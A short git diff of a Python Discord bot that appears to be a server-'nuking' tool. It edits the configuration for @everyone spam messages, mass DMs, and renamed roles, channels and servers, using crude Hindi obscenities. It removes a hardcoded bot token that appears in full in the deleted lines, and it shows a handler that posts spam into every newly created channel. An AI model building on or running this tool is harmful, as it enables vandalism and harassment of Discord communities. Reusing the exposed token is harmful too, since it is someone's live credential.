@@ -14,17 +14,17 @@ from discord.ext import commands
 
 prefix  = "?"                                                       #
 
-token = "ODM3OTU1MTY3NzczMTMwNzUy.YI0EkA.OSrmyyXqmJjHdVMOYvY9fhPgFKc"                                             #
+token = "token"                                             #
 
-spam_messages = "@everyone nuked by smoker"          #
+spam_messages = "@everyone server ki maa chud gyii"          #
 
-massdm = "Smoker OP"                   #
+massdm = "👀"                   #
 
-rolenames = "SMOKER OP"          #                                                           
+rolenames = "Chuda hua server"          #                                                           
 
-channels = "Smoker-ne-server-ki-maa-chod-di"   #
+channels = "Server ki maa chud gyii"   #
 
-sname = "Fucked By SMOKER"    #
+sname = "server ki maa chod di"    #
 
 key = input("Terminal Password\n> ")      #
 
@@ -350,4 +350,4 @@ async def on_guild_channel_create(channel):
 
         await channel.send(spam_messages)
 
-bot.run('ODM3OTU1MTY3NzczMTMwNzUy.YI0EkA.OSrmyyXqmJjHdVMOYvY9fhPgFKc')
+bot.run('')
